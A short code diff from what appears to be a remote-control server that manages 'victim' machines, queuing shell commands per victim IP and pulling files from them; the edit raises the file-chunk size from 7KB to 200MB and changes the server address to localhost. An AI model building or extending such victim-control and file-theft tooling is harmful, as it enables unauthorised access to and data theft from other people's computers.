@@ -145,8 +145,8 @@ class VictimShell(BaseShell):
             victim_table[self.targetIP]['command'].append('[get file {}]'.format(" ".join(parsed_arg)))
         
 
-    def _split_sending_file(self, filePath, split_len=7):
-        split_len = int(split_len * 1024) # 7KB씩 끊어서 전송
+    def _split_sending_file(self, filePath, split_len=200):
+        split_len = int(split_len * 1024 * 1024) # 200MB씩 끊어서 전송
 
         with open(filePath, 'rb') as f:
             data = f.read()
@@ -574,7 +574,7 @@ FILE_PATH = './file/'
 TMP_FILE_PATH = SEQManager.TMP_FILE_PATH
 
 ENCODING = 'cp949'
-SERVER_INFO = ('172.24.128.64', 80)
+SERVER_INFO = ('127.0.0.1', 80)
 
 victim_table = {} # {ip : {index : [index num], command : [command queue], shCommand : [sh queue], seqName : [seqName queue], sendIndex : [file index]}}
 victim_index = 0
